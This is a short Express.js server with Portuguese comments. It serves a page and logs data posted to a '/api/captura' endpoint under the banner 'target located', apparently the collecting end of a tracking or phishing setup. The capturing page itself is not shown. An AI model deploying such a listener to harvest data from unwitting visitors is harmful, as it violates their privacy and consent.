const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Serve a interface visual para o usuário
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Recebe e exibe os dados capturados no terminal
app.post('/api/captura', (req, res) => {
    console.log(`\n=================================`);
    console.log(`[ALVO LOCALIZADO] Dados recebidos:`);
    console.log(`=================================`);
    console.table(req.body);
    console.log(`=================================\n`);

    res.json({ status: "sucesso" });
});

app.listen(PORT, () => {
    console.log(`[OK] Servidor rodando na porta ${PORT}`);
});
